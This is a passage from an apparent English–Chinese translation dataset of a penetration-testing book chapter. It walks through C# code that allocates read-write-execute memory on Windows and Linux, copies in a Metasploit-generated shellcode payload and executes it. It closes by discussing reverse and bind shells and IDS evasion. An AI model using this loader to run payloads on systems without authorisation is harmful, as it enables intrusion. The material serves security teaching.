  zh: 现在我们可以设置我们的本地程序集负载。如果当前操作系统匹配一个 Windows 平台ID ➌（已知的平台和操作系统版本列表），我们会根据系统架构将一个字节数组分配给
    payload 变量。
- en: To allocate the memory required to execute the raw assembly code, we pass four
    arguments to VirtualAlloc() ➍. The first argument is IntPtr.Zero, which tells
    VirtualAlloc() to allocate the memory at the first viable location. The second
    argument is the amount of memory to allocate, which will equal the length of the
    current payload. This argument is cast to an IntPtr class that the unmanaged function
    understands in order for it to allocate enough memory to fit our payload.
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: 为了分配执行原始汇编代码所需的内存，我们将四个参数传递给 VirtualAlloc() ➍。第一个参数是 IntPtr.Zero，告诉 VirtualAlloc()
    在第一个可用的位置分配内存。第二个参数是要分配的内存大小，它等于当前有效负载的长度。此参数被转换为非托管函数可以理解的 IntPtr 类，以便为我们的有效负载分配足够的内存。
- en: The third argument is a magic value defined in kernel32.dll that maps to the
    MEM_COMMIT option, telling VirtualAlloc() to allocate the memory right away. This
    argument defines the mode in which the memory should be allocated. Finally, 0x40
    is a magic value defined by kernel32.dll that maps to the RWX (read, write, and
    execute) mode that we want. The VirtualAlloc() function will return a pointer
    to our newly allocated memory so we know where our allocated memory region begins.
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: 第三个参数是 kernel32.dll 中定义的一个魔法值，映射到 MEM_COMMIT 选项，告诉 VirtualAlloc() 立即分配内存。这个参数定义了内存分配的模式。最后，0x40
    是 kernel32.dll 中定义的一个魔法值，映射到我们需要的 RWX（读、写和执行）模式。VirtualAlloc() 函数将返回一个指向新分配内存的指针，以便我们知道分配的内存区域开始的位置。
- en: Now Marshal.Copy() ➎ copies our payload directly into the allocated memory space.
    The first argument passed to Marshal.Copy() is the byte array we want to copy
    into the allocated memory. The second is the index in the byte array to begin
    copying at, and the third is where to begin copying to (using the pointer returned
    by the VirtualAlloc() function). The last argument is how many bytes from the
    byte array we want to copy into the allocated memory (all).
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，Marshal.Copy() ➎ 将我们的有效负载直接复制到分配的内存空间中。传递给 Marshal.Copy() 的第一个参数是我们想要复制到分配内存的字节数组。第二个参数是字节数组中开始复制的索引，第三个参数是开始复制到的位置（使用
    VirtualAlloc() 函数返回的指针）。最后一个参数是我们想要从字节数组中复制到分配内存的字节数（全部）。
- en: Next, we reference the assembly code as an unmanaged function pointer using
    the WindowsRun delegate we defined at the top of the MainClass. We use the Marshal.GetDelegateForFunctionPointer()
    method ➏ to create a new delegate by passing the pointer to the beginning of our
    assembly code and the type of delegate as the first and second arguments, respectively.
    We cast the delegate returned by this method to our WindowsRun delegate type and
    then assign it to a new variable of the same WindowsRun type. Now all that’s left
    is to call this delegate as if it were a function and execute the assembly code
    we copied into memory.
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们通过使用在 MainClass 顶部定义的 WindowsRun 委托，将汇编代码作为非托管函数指针进行引用。我们使用 Marshal.GetDelegateForFunctionPointer()
    方法 ➏，通过将指向汇编代码开始位置的指针和委托类型分别作为第一个和第二个参数，创建一个新的委托。我们将此方法返回的委托转换为我们的 WindowsRun
    委托类型，然后将其赋值给一个新的相同类型的 WindowsRun 变量。现在，只需要像调用函数一样调用此委托，执行我们复制到内存中的汇编代码。
- en: Executing Native Linux Payloads
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: 执行本机 Linux 有效负载
- en: In this section, we look at how to define payloads that can be compiled once
    and run on both Linux and Windows. But first we need to import a few functions
    from libc and define our Linux unmanaged function delegate, as shown in [Listing
    4-27](#filepos406762).
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将介绍如何定义可以一次编译并在 Linux 和 Windows 上运行的有效负载。但首先，我们需要从 libc 导入一些函数，并定义我们的
    Linux 非托管函数委托，如[清单 4-27](#filepos406762)所示。
- en: '[DllImport("libc")]'
  id: totrans-390
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[DllImport("libc")]'
- en: static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);
  id: totrans-391
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);
- en: ''
  id: totrans-392
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '[DllImport("libc")]'
  id: totrans-393
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[DllImport("libc")]'
- en: static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr
    size);
  id: totrans-394
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr
    size);
- en: ''
  id: totrans-395
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '[DllImport("libc")]'
  id: totrans-396
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[DllImport("libc")]'
- en: static extern void free(IntPtr ptr);
  id: totrans-397
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: static extern void free(IntPtr ptr);
- en: ''
  id: totrans-398
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '[UnmanagedFunctionPointer(➊CallingConvention.Cdecl)]'
  id: totrans-399
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[UnmanagedFunctionPointer(➊CallingConvention.Cdecl)]'
- en: 'delegate void ➋LinuxRun(); Listing 4-27: Setting up the payload to run the
    generated Metasploit payloads'
  id: totrans-400
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: delegate void ➋LinuxRun(); 清单 4-27：设置有效负载以运行生成的 Metasploit 有效负载
- en: We add the lines shown in [Listing 4-27](#filepos406762) at the top of the MainClass
    near our Windows function import. We import three functions from libc—mprotect(),
    posix_memalign(), and free()—and define a new delegate called LinuxRun ➋. This
    has the UnmanagedFunctionPointer attribute, like our WindowsRun delegate. However,
    instead of passing CallingConvention.StdCall as we did in [Listing 4-25](#filepos398998),
    we pass CallingConvention.Cdecl ➊, because cdecl is the calling convention of
    native functions in a Unix-like environment.
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在靠近 Windows 函数导入的 MainClass 顶部添加了[清单 4-27](#filepos406762)中显示的行。我们从 libc 导入了三个函数——mprotect()、posix_memalign()
    和 free()——并定义了一个新的委托叫做 LinuxRun ➋。它具有 UnmanagedFunctionPointer 属性，就像我们的 WindowsRun
    委托一样。然而，和[清单 4-25](#filepos398998)中使用 CallingConvention.StdCall 不同，我们传递 CallingConvention.Cdecl
    ➊，因为 cdecl 是类 Unix 系统中的本地函数调用约定。
- en: In [Listing 4-28](#filepos408521), we now add an else if statement to our Main()
    method, following the if statement that tests whether we are on a Windows machine
    (refer to ➌ in [Listing 4-26](#filepos401856)).
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
  zh: 在[清单 4-28](#filepos408521)中，我们现在向 Main() 方法添加了一个 else if 语句，紧接着测试是否在 Windows
    机器上的 if 语句（参见[清单 4-26](#filepos401856)中的 ➌）。
- en: else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform
    == 128)
  id: totrans-403
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform
    == 128)
- en: '{'
  id: totrans-404
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (!x86)
  id: totrans-405
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (!x86)
- en: payload = new byte[] { [... X86-64 LINUX PAYLOAD GOES HERE ...] };
  id: totrans-406
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: payload = new byte[] { [... X86-64 LINUX PAYLOAD GOES HERE ...] };
- en: else
  id: totrans-407
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else
- en: 'payload = new byte[] { [... X86 LINUX PAYLOAD GOES HERE ...] }; Listing 4-28:
    Detecting the platform and assigning the appropriate payload'
  id: totrans-408
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'payload = new byte[] { [... X86 LINUX PAYLOAD GOES HERE ...] }; 清单 4-28: 检测平台并分配相应的负载'
- en: The original PlatformID enumeration from Microsoft did not include values for
    non-Windows platforms. As Mono has developed, unofficial values for Unix-like
    system Platform properties have been introduced, so we test the value of Platform
    directly against magic integer values rather than well-defined enumeration values.
    The values 4, 6, and 128 can be used to determine whether we’re running a Unix-like
    system. Casting the Platform property to an int allows us to compare the Platform
    value to the integer values 4, 16, and 128.
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: 来自微软的原始 PlatformID 枚举没有包括非 Windows 平台的值。随着 Mono 的发展，已经引入了类 Unix 系统的非官方 Platform
    属性值，因此我们直接将 Platform 的值与魔术整数值进行比较，而不是使用明确定义的枚举值。值 4、6 和 128 可用于确定我们是否在类 Unix 系统上运行。将
    Platform 属性转换为 int 使我们能够将 Platform 值与整数值 4、16 和 128 进行比较。
- en: Once we determine that we’re running on a Unix-like system, we can set up the
    values we need in order to execute our native assembly payloads. Depending on
    our current architecture, the payload byte array will be assigned either our x86
    or x86-64 payload.
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们确定在类 Unix 系统上运行，我们就可以设置执行本地汇编负载所需的值。根据当前的架构，负载字节数组将被分配为我们的 x86 或 x86-64
    负载。
- en: Allocating Memory
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 分配内存
- en: Now we begin allocating the memory to insert our assembly into memory, as shown
    in [Listing 4-29](#filepos410677).
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们开始分配内存以将汇编代码插入内存，如[清单 4-29](#filepos410677)所示。
- en: IntPtr ptr = IntPtr.Zero;
  id: totrans-413
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr ptr = IntPtr.Zero;
- en: IntPtr success = IntPtr.Zero;
  id: totrans-414
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr success = IntPtr.Zero;
- en: bool freeMe = false;
  id: totrans-415
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bool freeMe = false;
- en: try
  id: totrans-416
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: try
- en: '{'
  id: totrans-417
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: int pagesize = 4096;
  id: totrans-418
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int pagesize = 4096;
- en: IntPtr length = (IntPtr)payload.Length;
  id: totrans-419
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr length = (IntPtr)payload.Length;
- en: success = ➊posix_memalign(ref ptr, (IntPtr)32, length);
  id: totrans-420
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: success = ➊posix_memalign(ref ptr, (IntPtr)32, length);
- en: if (success != IntPtr.Zero)
  id: totrans-421
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (success != IntPtr.Zero)
- en: '{'
  id: totrans-422
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: 'Console.WriteLine("Bail! memalign failed: " + success);'
  id: totrans-423
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine("Bail! memalign failed: " + success);'
- en: return;
  id: totrans-424
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return;
- en: '}'
  id: totrans-425
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-29: Allocating the memory using  posix_memalign()'
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: '清单 4-29: 使用 posix_memalign() 分配内存'
- en: 'First, we define a few variables: ptr, which should be assigned the pointer
    at the beginning of our allocated memory by posix_memalign(), if all goes well;
    success, which will be assigned the value returned by posix_ memalign() if our
    allocation succeeds; and the Boolean value freeMe, which will be true when the
    allocation succeeds so that we know when we need to free the allocated memory.
    (We assign freeMe a value of false in case allocation fails.) Next we start a
    try block to begin the allocation so we can catch any exceptions and exit the
    payload gracefully if an error occurs. We set a new variable called pagesize to
    4096, which is equal to the default memory page size on most Linux installations.'
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们定义几个变量：ptr，它应该在分配成功后由posix_memalign()分配到我们的内存开始位置；success，它将被分配为posix_memalign()返回的值（如果分配成功）；以及布尔值freeMe，当分配成功时为true，这样我们就知道何时需要释放已分配的内存。（如果分配失败，我们将freeMe赋值为false。）接下来，我们开始一个try块以开始分配，以便我们能捕获任何异常，并在发生错误时优雅地退出有效载荷。我们将一个名为pagesize的新变量设置为4096，这是大多数Linux安装的默认内存页面大小。
- en: After assigning a new variable called length, which contains the length of our
    payload cast to an IntPtr, we call posix_memalign() ➊ by passing the ptr variable
    by reference so that posix_memalign() can alter the value directly without having
    to pass it back. We also pass the memory alignment (always a multiple of 2; 32
    is a good value) and the amount of memory we want to allocate. The posix_memalign()
    function will return IntPtr.Zero if the allocation succeeds, so we check for this.
    If IntPtr.Zero was not returned, we print a message about posix_memalign() failing
    and then return and exit from the payload. If the allocation is successful, we
    change the mode of the allocated memory to be readable, writable, and executable,
    as shown in [Listing 4-30](#filepos413515).
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 在分配了一个名为length的新变量，它包含了我们的有效载荷长度（转换为IntPtr类型）后，我们通过引用传递ptr变量来调用posix_memalign()
    ➊，以便posix_memalign()可以直接修改值，而无需将其传回。我们还传递了内存对齐（始终是2的倍数，32是一个不错的值）和我们要分配的内存量。如果分配成功，posix_memalign()函数将返回IntPtr.Zero，所以我们需要进行检查。如果没有返回IntPtr.Zero，我们会打印一条关于posix_memalign()失败的消息，然后返回并退出有效载荷。如果分配成功，我们将已分配内存的模式更改为可读、可写和可执行，详见[Listing
    4-30](#filepos413515)。
- en: freeMe = true;
  id: totrans-429
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: freeMe = true;
- en: IntPtr alignedPtr = ➊(IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
  id: totrans-430
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr alignedPtr = ➊(IntPtr)((int)ptr & ~(pagesize - 1)); //获取页面边界
- en: IntPtr ➋mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
  id: totrans-431
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr ➋mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- 注意selinux
- en: success = ➌mprotect(alignedPtr, (IntPtr)32, mode);
  id: totrans-432
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: success = ➌mprotect(alignedPtr, (IntPtr)32, mode);
- en: if (success != IntPtr.Zero)
  id: totrans-433
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (success != IntPtr.Zero)
- en: '{'
  id: totrans-434
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Console.WriteLine("Bail! mprotect failed");
  id: totrans-435
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("失败！mprotect失败");
- en: return;
  id: totrans-436
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return;
- en: '}'
  id: totrans-437
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-30: Changing the mode of the allocated memory'
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: 'Listing 4-30: 更改已分配内存的模式'
- en: NOTE
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: The technique used to achieve shellcode execution on Linux will not work on
    an operating system that restricts the allocation of RWX memory. For example,
    if your Linux distribution is running SELinux, these examples might not work on
    your machine. For this reason, I recommend Ubuntu—because SELinux is not present,
    the examples should run without issue.
  id: totrans-440
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在Linux上实现shellcode执行的技术在限制分配RWX内存的操作系统上不起作用。例如，如果你的Linux发行版启用了SELinux，这些示例可能无法在你的机器上运行。基于这个原因，我推荐使用Ubuntu——因为SELinux不存在，示例应该能顺利运行。
- en: In order to make sure we free the allocated memory later, we set freeMe to true.
    Next, we take the pointer that posix_memalign() set during allocation (the ptr
    variable) and create a page-aligned pointer using the page-aligned memory space
    we allocated by performing a bitwise AND operation on the pointer with the ones’
    complement of our pagesize ➊. In essence, the ones’ complement effectively turns
    our pointer address into a negative number so that our math for setting the memory
    permissions adds up.
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确保稍后能够释放分配的内存，我们将freeMe设置为true。接下来，我们使用posix_memalign()在分配过程中设置的指针（ptr变量），并通过对指针与页面大小的补码进行按位与操作，创建一个页面对齐的指针。这样，补码实际上将我们的指针地址转换为负数，从而使我们在设置内存权限时的数学计算正确。
- en: Because of the way Linux allocates memory in pages, we must change the mode
    for the entire memory page where our payload memory was allocated. The bitwise
    AND with the ones’ complement of the current pagesize will round the memory address
    given to us by posix_memalign() down to the beginning of the memory page where
    the pointer resides. This allows us to set the mode for the full memory page being
    used by the memory allocated by posix_memalign().
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: 由于Linux以页面为单位分配内存，我们必须更改我们有效载荷内存分配所在的整个内存页的模式。与当前页面大小的补码按位与运算将posix_memalign()给出的内存地址向下舍入到指针所在的内存页面的起始位置。这使我们能够为posix_memalign()分配的内存使用的整个内存页设置模式。
- en: We also create the mode to set the memory to by performing an OR operation on
    the values 0x04 (read), 0x02 (write), and 0x01 (execute) and storing the value
    from the OR operations in the mode variable ➋. Finally, we call mprotect() ➌ by
    passing the aligned pointer of the memory page, the alignment of the memory (as
    passed into the posix_memalign() function), and the mode to set the memory to.
    Like the posix_memalign() function, IntPtr.Zero is returned if mprotect() successfully
    changes the mode of the memory page. If IntPtr.Zero is not returned, we print
    an error message and return to exit the payload.
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还通过对值0x04（读取）、0x02（写入）和0x01（执行）执行按位或运算来创建设置内存的模式，并将按位或运算的结果存储在mode变量中 ➋。最后，我们通过传递内存页面的对齐指针、内存对齐方式（传递给posix_memalign()函数）以及设置内存的模式来调用mprotect()
    ➌。与posix_memalign()函数类似，如果mprotect()成功更改了内存页面的模式，则返回IntPtr.Zero。如果没有返回IntPtr.Zero，我们将打印错误信息并返回以退出有效载荷。
- en: Copying and Executing the Payload
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 复制并执行有效载荷
- en: We are now set up to copy our payload into our memory space and execute the
    code, as shown in [Listing 4-31](#filepos417127).
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经准备好将有效载荷复制到内存空间并执行代码，如[清单 4-31](#filepos417127)所示。
- en: ➊Marshal.Copy(payload, 0, ptr, payload.Length);
  id: totrans-446
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊Marshal.Copy(payload, 0, ptr, payload.Length);
- en: LinuxRun r = (LinuxRun)➋Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));
  id: totrans-447
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: LinuxRun r = (LinuxRun)➋Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));
- en: r();
  id: totrans-448
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: r();
- en: '}'
  id: totrans-449
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: finally
  id: totrans-450
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 最终
- en: '{'
  id: totrans-451
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (freeMe)
  id: totrans-452
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (freeMe)
- en: ➌free(ptr);
  id: totrans-453
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➌free(ptr);
- en: '}'
  id: totrans-454
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-455
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-31: Copying the payload to the allocated memory and executing the
    payload'
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 4-31：将有效载荷复制到分配的内存并执行有效载荷
- en: The last few lines of [Listing 4-31](#filepos417127) should look similar to
    the code we wrote to execute the Windows payload ([Listing 4-26](#filepos401856)).
    The Marshal.Copy() method ➊ copies our payload into our allocated memory buffer
    and the Marshal.GetDelegateForFunctionPointer() method ➋ turns the payload in
    memory into a delegate that we can call from our managed code. Once we have a
    delegate pointing to our code in memory, we call it in order to execute the code.
    A finally block following the try block frees the memory allocated by posix_memalign()
    if freeMe is set to true ➌.
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: '[清单 4-31](#filepos417127)的最后几行代码应该类似于我们编写的执行Windows有效载荷的代码（[清单 4-26](#filepos401856)）。Marshal.Copy()方法
    ➊ 将我们的有效载荷复制到分配的内存缓冲区中，而Marshal.GetDelegateForFunctionPointer()方法 ➋ 将内存中的有效载荷转换为我们可以从托管代码中调用的委托。一旦我们有了指向内存中代码的委托，我们就可以调用它以执行代码。紧跟着try块的finally块会释放由posix_memalign()分配的内存，前提是freeMe设置为true
    ➌。'
- en: Finally, we add our generated Windows and Linux payloads to the cross-platform
    payload, which allows us to compile and run the same payload on either Windows
    or Linux.
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们将生成的Windows和Linux有效载荷添加到跨平台有效载荷中，这使我们能够在Windows或Linux上编译并运行相同的有效载荷。
- en: Conclusion
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: 结论
- en: In this chapter, we discussed a few different ways to create custom payloads
    that are useful in a variety of circumstances.
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们讨论了几种不同的方法来创建在各种情况下有用的自定义有效载荷。
- en: Payloads that utilize TCP can provide benefits when you are attacking a network,
    from getting a shell from an internal network to maintaining persistence. Using
    a connect-back technique, you can achieve a shell on a remote box, thus aiding
    in a phishing campaign, for example, where a pentest is completely external from
    the network. A bind technique, on the other hand, can help you maintain persistence
    on boxes without having to exploit the vulnerability on the machine again if internal
    access to the network is available.
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 使用TCP的有效载荷在攻击网络时可以带来好处，从从内部网络获取Shell到维持持久性。通过使用回连技术，你可以在远程主机上获得Shell，从而有助于例如网络钓鱼活动，在这种活动中，渗透测试完全是外部的。另一方面，绑定技术可以帮助你在不必再次利用机器上的漏洞的情况下，在主机上维持持久性，前提是可以访问内部网络。
- en: Payloads that communicate over UDP can often get around poorly configured firewalls
    and might be able to bypass an intrusion detection system focused on TCP traffic.
    Although less reliable than TCP, UDP offers the speed and stealth that the heavily
    scrutinized TCP generally can’t provide. By using a UDP payload that listens for
    incoming broadcasts, attempts to execute the commands sent, and then broadcasts
    the results back you, your attacks can be a bit quieter and possibly stealthier
    at the expense of stability.
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 UDP 通信的有效载荷通常能够绕过配置不当的防火墙，并且可能能够避开专注于 TCP 流量的入侵检测系统。尽管比 TCP 不那么可靠，UDP 提供的速度和隐蔽性是
    TCP 无法提供的，尤其是在严格审查的情况下。通过使用一个监听传入广播的 UDP 有效载荷，尝试执行发送的命令，然后将结果广播回你，你的攻击可能会变得更加安静，也许会更加隐蔽，尽管在稳定性上有所牺牲。
- en: Metasploit allows an attacker to create many types of payloads on the fly, and
    it’s easy to install and get running. Metasploit includes the msfvenom tool, which
    creates and encodes payloads for use in exploits. Using the msfvenom tool to generate
    native assembly payloads, you can build a small, cross-platform executable to
    detect and run shellcode for a variety of operating systems. This gives you great
    flexibility in the payloads that are run on a target’s box. It also makes use
    of one of the most powerful and useful Metasploit features available.
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 允许攻击者快速创建多种类型的有效载荷，并且安装和运行都非常简单。Metasploit 包含 msfvenom 工具，能够创建并编码用于漏洞利用的有效载荷。使用
    msfvenom 工具生成本地汇编有效载荷后，你可以构建一个小型的跨平台可执行文件，用于检测并运行各种操作系统的 shellcode。这为你在目标主机上运行有效载荷提供了极大的灵活性。它还利用了
    Metasploit 中最强大、最有用的功能之一。
